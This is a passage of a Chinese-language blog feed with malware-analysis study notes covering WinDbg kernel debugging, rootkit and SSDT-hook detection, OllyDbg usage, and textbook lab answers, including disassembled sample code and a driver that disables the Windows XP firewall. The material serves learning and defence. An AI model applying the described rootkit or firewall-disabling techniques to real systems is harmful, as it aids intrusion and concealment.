a1)</span><br>&#123;<br>  DWORD NumberOfBytesWritten; <span class="hljs-comment">// [esp+4h] [ebp-404h]</span><br>  <span class="hljs-type">char</span> Buffer; <span class="hljs-comment">// [esp+8h] [ebp-400h]</span><br><br>  <span class="hljs-keyword">while</span> ( !sub_10001030(a1) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_DWORD *)a1 )<br>    &#123;<br>      <span class="hljs-built_in">sprintf</span>(&amp;Buffer, aSS, a1 + <span class="hljs-number">4</span>, a1 + <span class="hljs-number">1032</span>);<br>      WriteFile(*(HANDLE *)(a1 + <span class="hljs-number">2060</span>), &amp;Buffer, <span class="hljs-built_in">strlen</span>(&amp;Buffer), &amp;NumberOfBytesWritten, <span class="hljs-number">0</span>);<br>    &#125;<br>    Sleep(<span class="hljs-number">0xA</span>u);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>6.这个恶意代码将收集的数据存放在何处？</strong></p><p><code>C:\\WINDOWS\\System32\\kernel64x.dll</code></p><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>ShellCode</tag>
      
      <tag>恶意行为分析</tag>
      
      <tag>特洛伊木马化技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用WinDbg调试内核</title>
    <link href="/2019/03/%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/"/>
    <url>/2019/03/%E4%BD%BF%E7%94%A8WinDbg%E8%B0%83%E8%AF%95%E5%86%85%E6%A0%B8/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><code>WinDbg</code>是微软提供的一个免费调试器，支持内核调试，也具有监控Windows系统交互的功能。</p><p><strong>驱动与内核代码：</strong>Windows设备驱动简称为驱动，他让第三方开发商在Windows内核模式下运行代码。驱动程序常驻与内存，并且负责响应用户态程序的请求，而且应用程序不直接与驱动程序通信，而是直接访问设备对象，向具体的物理设备发送请求。设备对象由驱动程序创建和销毁，可以被用户态的程序直接访问，但他们并不一定是真实的物理设备。为了系统能正常工作，驱动程序必须加载到内核空间，这与DLL需要加载到进程空间道理相同，当驱动被首次加载时，<code>DriverEntry</code>函数将被调用。</p><p>与DLL通过导出函数表来提供其功能不同，驱动程序通过注册回调函数来提供功能。当用户态的应用程序请求一个服务时，这些回调函数将被调用。回调函数在<code>DriverEntry</code>程序中被注册。Window会为每个条创建一个驱动对象，并以参数形式将其传递给<code>DriverEntry</code>函数，<code>DriverEntry</code>函数用回调函数填充这个驱动对象。然后<code>DriverEntry</code>会创建一个可以被用户态应用程序访问的设备对象，应用程序与去当的交互请求都通过这个设备对象进行。</p><span id="more"></span><p>考虑到来自用户态应用程序的一个读取数据的请求。最终这个请求发送到负责管理硬件并存储读入数据的驱动程序。首先，用户态的应用程序应该获得该硬件设备的一个文件句柄，然后再该具柄上调用函数<code>ReadFile</code>，接着内核会处理<code>ReadFile</code>函数的请求，最终由驱动程序的回调函数来响应对IO设备的读请求。七个球内核态的而已组建最常见函数时<code>DeviceIoControl</code>，它是从用户态模块到内核折别的一种通用请求方法，使用该函数时，用户态应用程序传递一个任意长度的缓冲区数据作为输入，并且接收一个任意长度的缓冲区作为输出。</p><p><strong>安装内核调试：</strong>由于运行内核调试时操作系统会被冻结，因此我们需要<code>Vmware</code>来进行这一操作，与用户态调试不同，内核调试需要一些初始化设置。首先要在虚拟机系统中开启内核调试，然后配置<code>Vmware</code>使虚拟机与宿主系统之间有一条虚拟化的串口，同时还应该配置宿主系统中的<code>WinDbg</code>。详细的配置方法在网上能搜索到，在这里就不赘述了 。</p><p><code>boot.ini</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[boot loader]</span><br>timeout=<span class="hljs-number">30</span><br>default=<span class="hljs-built_in">multi</span>(<span class="hljs-number">0</span>)<span class="hljs-built_in">disk</span>(<span class="hljs-number">0</span>)<span class="hljs-built_in">rdisk</span>(<span class="hljs-number">0</span>)<span class="hljs-built_in">partition</span>(<span class="hljs-number">1</span>)\WINDOWS<br><span class="hljs-selector-attr">[operating systems]</span><br><span class="hljs-function"><span class="hljs-title">multi</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">disk</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">rdisk</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>\WINDOWS=<span class="hljs-string">&quot;Microsoft Windows XP Professional&quot;</span> /noexecute=optin /fastdetect<br><span class="hljs-function"><span class="hljs-title">multi</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">disk</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">rdisk</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span><span class="hljs-title">partition</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>\WINDOWS=<span class="hljs-string">&quot;Microsoft Windows XP Professional with Kernel Debugging&quot;</span> /noexecute=optin /fastdetect /debug /debugport=COM1 /baudrate=<span class="hljs-number">115200</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/18/5c8f828a56e16.png"></p><p><strong>WinDbg读取内存中的数据：</strong>通过再WinDbg的内存窗口输入如下指令来读取程序数据或堆栈等内存位置：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dx addressToLoad</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>da</td><td>读取内存数据并以ASCII文本显示</td></tr><tr><td>du</td><td>读取内存数据并以Unicode文本显示</td></tr><tr><td>dd</td><td>读取内存数据并以32位双字显示</td></tr></tbody></table><p>e命令与d类似，可以用来改变内存中的值：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">ex</span> addressToWrite <span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p><strong>使用算术运算符：</strong><code>Windbg</code>支持再命令行中使用简单的算术操作符，对内存和寄存器进行直接操作，如加减乘除。命令<code>dwo</code>用来解引用一个32位的指针并查看该指针代表的地址的值。例如设置一个函数断点，该函数的第一个参数是一个宽字符串指针，通过下面命令可以查看字符串的内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">du</span> dwo (esp+<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><strong>设置断点：</strong>使用bp命令来设置基本断点，使用g（go）命令可以再断点处执行一个动作后继续执行而不用等待用户，例如，下面这个命令可以再每次调用GetProcAddress函数时，在不中断程序执行的前提下，打印出第二个参数：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> GetProcAddress <span class="hljs-string">&quot;da dwo(esp+8);g&quot;</span><br></code></pre></td></tr></table></figure><p><strong>列举模块：</strong>WinDgb无法向OD一样通过内存映射列举出所有内存段与加载模块，但是Windbg没有类似的功能。但是可以使用<code>lm</code>命令来列举加载到进程空间的所有模块，包括用户模式下的可执行模块，DLL以及内核模式下的内核驱动，同时也会列举出每个模块的起始与结束地址。</p><p><strong>微软符号表：</strong>调试符号提供了游戏安的源代码信息，用来帮助我们理解汇编代码，微软的调试符号表中包含默写函数和变量的名字。</p><p><strong>搜索符号：</strong>WinDbg的符号格式如下：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moduleName!symbolName<br></code></pre></td></tr></table></figure><p>这种语法可以在任何一个拥有正常地址的地方使用，其中<code>moduleName</code>表示<code>exe</code>、<code>dll</code>或者<code>sys</code>文件的文件名（不包含文件扩展名），<code>SymbolName</code>是与这个地址关联的一个名字。其中<code>ntoskrnl.exe</code>文件是一个特例，他的<code>moduleName</code>是<code>nt</code>。</p><p><code>bu</code>命令允许我们用符号在没有加载的代码中设置一个延迟断点。延迟断点是一个断点，当加载的额名字匹配模块时延迟断点才会被设置。命令<code>bu $iment(driverName)</code>回在任何驱动程序代码运行之前在其入口点设置一个断点。</p><p><code>z</code>命令可以用来使用通配符来搜索函数或者符号。如使用<code>x nt!*CreateProcess*</code>可以搜索<code>ntoskrnl.exe</code>中包含字符串<code>CreateProcess</code>的所有函数。</p><p><code>ln</code>命令用来例如出最接近给定内存地址的符号，他可以用来确认指针指向的函数。</p><p><strong>查看结构信息：</strong>微软符号也包含多个数据结构的类型信息，包括没有被公开的内部类型。这对恶意代码分析人员非常有用，因为恶意代码经常操作未公开的数据结构。</p><p><strong>内核代码：</strong>恶意代码的编写者坑会从内核空间写文件，因为这样可能会绕过一些安全产品的审查，同时也可以误导哪些尝试查找用户空间中<code>CreateFile</code>、<code>WriteFile</code>函数作为调用证据的恶意代码分析师。在内核模式下，普通的Win32函数不能直接被调用，所以内核模式下会有新的函数来取代这些函数。</p><p><strong>内核模式的代码：</strong>在使用VMware调试内核时，如果看到系统频繁的加载和卸载KMixer.sys这是正常现象，与恶意活动无关。我们需要找到驱动对象来确定调用了哪些恶意驱动的代码。我们能知道驱动的名字，所以我们可以使用<code>!drvobj</code>命令来找到驱动对象。</p><p><strong>Rootkit:</strong><code>Rootkit</code>通过修改操作系统内部函数来隐藏自己存在的痕迹。通过这种修改，<code>Rootkit</code>可以隐藏一个长在运行的程序的文件、进程、网络连接等其他资源，这种恶意活动难以被反病毒产品及安全分析员发现。大部分<code>Rootkit</code>时通过某种方式来修改操作系统内核来工作的，但是在实际应用中，系统服务描述表挂钩技术的使用成都远远超过其他技术，但是缺点是容易被探测，但是由于这种方法实现简单且便于使用，因此到现在这种方法还是很常见。</p><p><strong>系统服务描述表（SSDT）：</strong>也成为系统服务分发表，微软使用它来查找进入内核的系统调用，它通常不被第三方应用程序或者驱动程序访问，内核态代码只能被用户态的<code>SYSCALL</code>、<code>SYSENTER</code>、<code>INT 0x2E</code>指令来访问。</p><p>**Rootkit挂钩SSDT:**假设一个系统已经感染了恶意驱动，我们需要先检查<code>SSDT</code>是否被挂钩，在<code>WinDbg</code>中通过存放在<code>nt!KeServiceDescripterTable</code>表中的偏移量查看<code>SSDT</code>表。<code>SSDT</code>表中的所有函数偏移量都因该指向位于NT模块的地址范围内的函数，通过查看<code>ntoskrnl.exe</code>模块的起始地址和结束地址来确定地址边界，若表中的地址在这个地址边界之外，那么就能确定<code>SSDT</code>被挂钩了。一旦确定了被挂钩的驱动程序（<code>lm指令</code>），下一步就是查找安装挂钩的代码段和执行挂钩的函数，在IDA中查找挂钩函数引用的数据。</p><p><strong>中断：</strong>有时Rootkit使用中断来干扰系统时间，现代的处理器实现了用硬件方式触发软件事件的中断，系统发送一条指令到硬件，硬件处理完请求事件后会中断处理器。有时驱动或Rootkit会使用中断来执行代码，驱动程序调用<code>IoConnectInterrup</code>函数位特定中断注册一个处理程序，然后为这个中断指定一个中断服务例程（ISR），每当触发该中断时，系统都会调用注册的中断服务例程。中断描述表（IDT）中存储着ISR的信息，在WinDbg中可以通过<code>!idt</code>命令查看。如果发现中断位于一个没有名字、没有签名或可疑的驱动中，则表明存在Rootkit或者恶意代码。</p><p><strong>加载驱动：</strong>我们可以通过<code>OSR Driver Loader</code>加载工具来加载驱动程序。</p><p><strong>Windows系统更新带来的差异：</strong>新的Windows做了很大的改变，这些改变会涌向内核调试的过程每一集恶意代码的有效性。从<code>Windows Vista</code>开始，最大的一个改变就是<code>boot.ini</code>文件不再用来负责引导系统，我们需要BCDEdit工具来修改引导配置。在安全方面，新的系统引入了内核保护补丁机制，通常被称为<code>PatchGuard</code>，内核保护能组织第三方程序修改内核。在64位版本的<code>Vista</code>系统中，Windows强制执行驱动签名机制，没有数字签名的内核驱动无法被加载到系统中，所以这是一个对抗恶意内核驱动的有效措施。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab10-1"><a href="#Lab10-1" class="headerlink" title="Lab10-1"></a>Lab10-1</h3><p><strong>本实验包括一个驱动程序和一个可执行文件。你可以从任意位置运行可执行文件，但为了使程序能正常运行，，必须将程序放到C:\Windows\System32目录下，这个目录在受害者的计算机中已存在。可执行文件使Lab10-1.exe，驱动程序使Lab10-01.sys。</strong></p><p><strong>问题</strong></p><p><strong>1.这个程序是否直接修改了注册表（使用Procmon来检查）？</strong></p><p>在<code>ProcMon</code>中发现程序只对如下键进行了修改：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HKLM</span>\SOFTWARE\Microsoft\Cryptography\RNG\Seed<br><span class="hljs-attribute">Type</span>: REG_BINARY, Length: <span class="hljs-number">80</span>, Data: <span class="hljs-number">5</span>D <span class="hljs-number">5</span>E <span class="hljs-number">85</span> <span class="hljs-number">61</span> <span class="hljs-number">23</span> D1 <span class="hljs-number">3</span>F <span class="hljs-number">6</span>F <span class="hljs-number">65</span> AE D8 <span class="hljs-number">01</span> B5 <span class="hljs-number">2</span>E <span class="hljs-number">98</span> EA<br></code></pre></td></tr></table></figure><p><strong>2.用户态的程序调用了ControlService函数，你是否能够使用WinDbg设置一个断点，从此来观察由于ControlService的调用导致内核执行了怎样的操作。</strong></p><p>在IDA中看到Lab10-01.exe调用了ControlService来进行驱动的写在操作，为了方便分析，在WindowsXP中安装WinDbg来打开Lab10-01.exe并在ControlService调用处下一个断点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0040107C                 push    eax             ; lpServiceStatus<br>.text:0040107D                 push    1               ; dwControl<br>.text:0040107F                 push    esi             ; hService<br>.text:00401080                 call    ds:ControlService<br></code></pre></td></tr></table></figure><p>Windbg中信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Executable search path is: <br>ModLoad: 00400000 00407000   image00400000<br>ModLoad: 7c920000 7c9b3000   ntdll.dll<br>ModLoad: 7c800000 7c91e000   C:\WINDOWS\system32\kernel32.dll<br>ModLoad: 77da0000 77e49000   C:\WINDOWS\system32\ADVAPI32.dll<br>ModLoad: 77e50000 77ee2000   C:\WINDOWS\system32\RPCRT4.dll<br>ModLoad: 77fc0000 77fd1000   C:\WINDOWS\system32\Secur32.dll<br>(c0.f8): Break instruction exception - code 80000003 (first chance)<br><span class="hljs-attribute">eax</span>=00241eb4 <span class="hljs-attribute">ebx</span>=7ffd6000 <span class="hljs-attribute">ecx</span>=00000007 <span class="hljs-attribute">edx</span>=00000080 <span class="hljs-attribute">esi</span>=00241f48 <span class="hljs-attribute">edi</span>=00241eb4<br><span class="hljs-attribute">eip</span>=7c92120e <span class="hljs-attribute">esp</span>=0012fb20 <span class="hljs-attribute">ebp</span>=0012fc94 <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na po nc<br><span class="hljs-attribute">cs</span>=001b  <span class="hljs-attribute">ss</span>=0023  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=003b  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00000202<br>*** ERROR: Symbol file could <span class="hljs-keyword">not</span> be found.  Defaulted <span class="hljs-keyword">to</span> <span class="hljs-built_in">export</span> symbols <span class="hljs-keyword">for</span> ntdll.dll - <br>ntdll!DbgBreakPoint:<br>7c92120e cc              int     3<br>0:000&gt; bp 00401080<br>breakpoint 0 redefined<br></code></pre></td></tr></table></figure><p>点击运行，运行至断点处WinDbg输出如下信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Breakpoint 0 hit<br><span class="hljs-attribute">eax</span>=0012ff1c <span class="hljs-attribute">ebx</span>=7ffd6000 <span class="hljs-attribute">ecx</span>=77dbfb6d <span class="hljs-attribute">edx</span>=00000000 <span class="hljs-attribute">esi</span>=00144050 <span class="hljs-attribute">edi</span>=00144f60<br><span class="hljs-attribute">eip</span>=00401080 <span class="hljs-attribute">esp</span>=0012ff08 <span class="hljs-attribute">ebp</span>=0012ffc0 <span class="hljs-attribute">iopl</span>=0         nv up ei pl nz na pe nc<br><span class="hljs-attribute">cs</span>=001b  <span class="hljs-attribute">ss</span>=0023  <span class="hljs-attribute">ds</span>=0023  <span class="hljs-attribute">es</span>=0023  <span class="hljs-attribute">fs</span>=003b  <span class="hljs-attribute">gs</span>=0000             <span class="hljs-attribute">efl</span>=00000206<br>image00400000+0x1080:<br>*** ERROR: Symbol file could <span class="hljs-keyword">not</span> be found.  Defaulted <span class="hljs-keyword">to</span> <span class="hljs-built_in">export</span> symbols <span class="hljs-keyword">for</span> C:\WINDOWS\system32\ADVAPI32.dll - <br>00401080 ff1510404000    call    dword ptr [image00400000+0x4010 (00404010)] ds:0023:00404010=&#123;ADVAPI32!ControlService (77dc49dd)&#125;<br></code></pre></td></tr></table></figure><p><strong>3.这个程序做了些什么？</strong></p><p>这个程序通过创建服务来加载驱动，修改注册表<code>\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile</code>和<code>\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile</code>来禁用WindowsXP的防火墙</p><h3 id="Lab10-2"><a href="#Lab10-2" class="headerlink" title="Lab10-2"></a>Lab10-2</h3><p><strong>该实验的文件为Lab10-02.exe。</strong></p><p><strong>问题</strong></p><p><strong>1.这个程序创建文件了吗，它创建了什么文件？</strong></p><p><strong>2.这个程序有内核组件吗？</strong></p><p><strong>3.这个程序做了些什么？</strong></p><h3 id="Lab10-3"><a href="#Lab10-3" class="headerlink" title="Lab10-3"></a>Lab10-3</h3><p><strong>本实验包括一个驱动程序和一个可执行文件。你可以从任意位置运行可执行文件，但为了使程序能正常运行，，必须将程序放到C:\Windows\System32目录下，这个目录在受害者的计算机中已存在。可执行文件使Lab10-3.exe，驱动程序是Lab10-03.sys。</strong></p><p><strong>问题</strong></p><p><strong>1.这个程序做了些什么？</strong></p><p><strong>2.一旦运行，你怎样停止它？</strong></p><p><strong>3.它的内核组件做了什么操作？</strong></p><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>动态分析</tag>
      
      <tag>内核调试</tag>
      
      <tag>WinDbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OllyDbg使用方法</title>
    <link href="/2019/03/OllyDbg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2019/03/OllyDbg%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>加载恶意代码：</strong>OD可以直接加载可执行文件，也可以加载DLL文件，也可以将调试器附加在进程中，我们甚至可以用命令行运行恶意代码或者执行DLL中的某个函数。</p><p><strong>加载可执行文件：</strong>在加载可执行文件的时候OD会使用它的加载器来加载这个程序，并可在此过程选择运行的命令行参数。如果OD能确定程序的main函数就在main处中断，否则在程序PE头提供的程序入口点中断。</p><p><strong>附加调试器到一个程序：</strong>OD在附加到一个进程时会立即暂停这个程序以及它所有的线程。</p><p><strong>OD窗口：</strong>OD有如下几个常用窗口：</p><ul><li>反汇编窗口：这个窗口显示了被调试程序的代码，下一条要执行的指令回在窗口中高亮显示，如果项修改指令或者数据，可以在此窗口中敲击空格键。</li><li>寄存器窗口：这个窗口会显示程序寄存器的当前状态，代码在调试过程中，如果莫格寄存器的值发生了改变，则此寄存器就会从黑色变成红色。右键某个寄存器选择Modify就可以修改某个寄存器中的值。</li><li>栈窗口：这个窗口会显示被调试宪曾在内存中的当前状态。这个窗口总会显示给定线程得到栈顶。OD会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</li><li>内存转储窗口：这个窗口显示被调试进程的实时内存转储。</li></ul><span id="more"></span><p><strong>内存映射：</strong>内存映射窗口显示了被调试程序的所有内存块。</p><p><strong>基地址重定位：</strong>基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。Windows中所有PE文件都有一个预定的基地址，它在PE文件头中称为映像基地址。大部分可执行程序都被预加载到0x00400000处，这是Windows下大多数编译器使用的默认地址，支持ALSR的程序经常被重定位。</p><p><strong>绝对地址与相对地址：</strong>多数执行会引用内存中的相对地址，但是有些却引用内存的绝对地址。多数DLL回在PE头的.reloc节打包一个修改位置的列表。DLL的重定位会对性能造成影响，会增加加载的时间。</p><p><strong>查看线程和堆栈：</strong>恶意代码通常使用多线程。我们在OD中可以选择View-&gt;Threads来查看线程面板窗口，这个窗口显示了线程的内存地址。由于OD时单线程的，多以我们需要暂停所有的线程，设置一个断点，继续运行程序，这样就可以保证程序在一个特定的线程内调试。</p><p><strong>加载DLL：</strong>OD使用一个名为loaddll.exe的虚拟程序来加载DLL，然后再其主入口处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，此时DllMain函数运行完毕之后选择Debug-&gt;Call DLL Export就可以调用DLL的导出函数，并调试它。</p><p><strong>异常处理：</strong>当异常发生时，你可以通过以下热键来决定如何处理这个异常：</p><ul><li>Shift+F7：进入异常</li><li>Shift+F8：跳过异常</li><li>Shift+F9：运行异常处理</li></ul><p><strong>分析ShellCode：</strong>OD有一种分析ShellCode的简单方法，下面是这个方法的步骤：</p><ul><li>将ShellCode从十六进制编辑器复制到剪切板</li><li>再内存映射窗口中选择类型为Priv的内存区域（私有）</li><li>双击这个内存窗口中的某一行，会弹出一个十六进制转储窗口，你可以检查他的内容。该区域应该包含几百个连续为0的字节。</li><li>右键该区域，赋予这个区域读、写、运行的权限。</li><li>返回内存转储窗口，选择刚才的内存区域将ShellCode粘贴进去。</li><li>设置EIP为刚才的内存地址。</li><li>完成</li></ul><p><strong>调试器隐藏插件：</strong>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab9-1"><a href="#Lab9-1" class="headerlink" title="Lab9-1"></a>Lab9-1</h3><p><strong>用OllyDbg和IDA Pro分析恶意代码文件Lab09-01.exe，回答下列问题。再第三章中我们使用基础的静态和动态分析技术，已经对这个恶意代码做了初步的分析。</strong></p><p><strong>问题</strong></p><p><strong>1.如何让这个恶意代码安装自身？</strong></p><p>首先这道题先前在第三章分析过，但是当时还没有学习动态调试地知识，因此将本题留在了本章，根据之前静态分析地结果我们可以知道这个程序可能会因为参数地错误而进行自我删除，执行删除指令的代码如下：</p><p><img src="https://i.loli.net/2019/03/15/5c8b8331f1d2e.png"></p><p>我们先找到程序的主函数所在位置，这些代码会判断程序是否有参数，如果没有参数则会直接执行上图中的自我删除动作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00402AF0                 push    ebp<br>.text:00402AF1                 mov     ebp, esp<br>.text:00402AF3                 mov     eax, 182Ch<br>.text:00402AF8                 call    __alloca_probe<br>.text:00402AFD                 cmp     [ebp+argc], 1<br>.text:00402B01                 jnz     short loc_402B1D<br>.text:00402B03                 call    sub_401000<br>.text:00402B08                 test    eax, eax<br>.text:00402B0A                 jz      short loc_402B13<br>.text:00402B0C                 call    sub_402360<br>.text:00402B11                 jmp     short loc_402B18<br></code></pre></td></tr></table></figure><p>但是如果程序带有参数，程序则会进入参数判断的过程，参数字符串判断函数的完成汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00402510                 push    ebp<br>.text:00402511                 mov     ebp, esp<br>.text:00402513                 push    ecx<br>.text:00402514                 push    edi<br>.text:00402515                 mov     edi, [ebp+arg_0]<br>.text:00402518                 or      ecx, 0FFFFFFFFh<br>.text:0040251B                 xor     eax, eax<br>.text:0040251D                 repne scasb<br>.text:0040251F                 not     ecx<br>.text:00402521                 add     ecx, 0FFFFFFFFh<br>.text:00402524                 cmp     ecx, 4<br>.text:00402527                 jz      short loc_40252D<br>.text:00402529                 xor     eax, eax<br>.text:0040252B                 jmp     short loc_4025A0<br>.text:0040252D ; ---------------------------------------------------------------------------<br>.text:0040252D<br>.text:0040252D loc_40252D:                             ; CODE XREF: sub_402510+17↑j<br>.text:0040252D                 mov     eax, [ebp+arg_0]<br>.text:00402530                 mov     cl, [eax]<br>.text:00402532                 mov     [ebp+var_4], cl<br>.text:00402535                 movsx   edx, [ebp+var_4]<br>.text:00402539                 cmp     edx, 61h<br>.text:0040253C                 jz      short loc_402542<br>.text:0040253E                 xor     eax, eax<br>.text:00402540                 jmp     short loc_4025A0<br>.text:00402542 ; ---------------------------------------------------------------------------<br>.text:00402542<br>.text:00402542 loc_402542:                             ; CODE XREF: sub_402510+2C↑j<br>.text:00402542                 mov     eax, [ebp+arg_0]<br>.text:00402545                 mov     cl, [eax+1]<br>.text:00402548                 mov     [ebp+var_4], cl<br>.text:0040254B                 mov     edx, [ebp+arg_0]<br>.text:0040254E                 mov     al, [ebp+var_4]<br>.text:00402551                 sub     al, [edx]<br>.text:00402553                 mov     [ebp+var_4], al<br>.text:00402556                 movsx   ecx, [ebp+var_4]<br>.text:0040255A                 cmp     ecx, 1<br>.text:0040255D                 jz      short loc_402563<br>.text:0040255F                 xor     eax, eax<br>.text:00402561                 jmp     short loc_4025A0<br>.text:00402563 ; ---------------------------------------------------------------------------<br>.text:00402563<br>.text:00402563 loc_402563:                             ; CODE XREF: sub_402510+4D↑j<br>.text:00402563                 mov     al, [ebp+var_4]<br>.text:00402566                 mov     dl, 63h<br>.text:00402568                 imul    dl<br>.text:0040256A                 mov     [ebp+var_4], al<br>.text:0040256D                 movsx   eax, [ebp+var_4]<br>.text:00402571                 mov     ecx, [ebp+arg_0]<br>.text:00402574                 movsx   edx, byte ptr [ecx+2]<br>.text:00402578                 cmp     eax, edx<br>.text:0040257A                 jz      short loc_402580<br>.text:0040257C                 xor     eax, eax<br>.text:0040257E                 jmp     short loc_4025A0<br>.text:00402580 ; ---------------------------------------------------------------------------<br>.text:00402580<br>.text:00402580 loc_402580:                             